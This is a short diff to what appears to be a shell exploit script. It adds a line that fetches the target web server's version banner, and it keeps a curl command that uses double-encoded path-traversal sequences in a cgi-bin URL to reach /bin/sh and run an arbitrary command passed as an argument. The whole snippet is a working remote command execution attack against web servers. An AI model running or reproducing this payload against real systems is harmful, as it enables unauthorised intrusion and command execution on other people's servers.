@@ -19,4 +19,6 @@ echo  "try: ./$0 id"
 exit 1
 fi
 
+echo "WebServer Version: " $(curl -I -L -s $target | grep -i server)
+
 curl "$target/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" -d "echo Content-Type: text/plain; echo; $1"
